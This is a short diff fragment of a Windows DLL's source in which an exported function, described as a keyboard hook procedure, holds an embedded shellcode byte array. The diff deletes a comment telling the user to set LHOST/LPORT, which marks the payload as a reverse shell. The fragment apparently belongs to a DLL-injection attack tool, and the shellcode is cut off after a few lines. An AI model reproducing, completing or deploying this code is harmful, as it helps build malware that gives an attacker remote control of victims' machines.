@@ -16,7 +16,6 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 
 // Named export — hook procedure called by Windows on keyboard events
 extern "C" __declspec(dllexport) int spotlessExport() {
-    // Shellcode from common.h — update LHOST/LPORT as needed
     unsigned char shellcode[] =
         "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
         "\xff\xff\xff\x48\xbb\x83\x8f\xca\x45\xab\xc6\x22\xa6\x48"
